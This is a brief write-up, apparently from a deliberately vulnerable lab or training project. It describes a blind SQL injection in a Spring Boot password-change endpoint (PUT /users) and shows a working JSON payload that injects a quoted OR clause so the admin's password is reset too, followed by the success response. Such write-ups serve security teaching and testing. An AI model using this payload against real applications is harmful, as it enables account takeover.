# Blind SQL Injection
A variant of SQL injection, a database query manipulation attack against structured query language (SQL), that does not have visual output during a successful attack.

## Exploitation
**Prerequisites:** _Authenticated_

**Location:** _PUT /users_

Blind SQL Injection present within SpringBoot code for changing password.  Can be escaped to, for example, change the passwords of other users in addition to itself.  Below is an exploitation example:

    PUT /users
    raw:
    {
        "username":"ding' OR username = 'admin",
        "newPassword":"password10!"
    }

This example assumes the attacker's name is _ding_ and adds _' OR username = 'admin"_ after specifying the username to change the password of the admin account to _password10!_ alongside the attacker's account.

Successful exploitation looks like:

    {
        "success": true,
        "code": 200,
        "message": "Password updated successfully."
    }

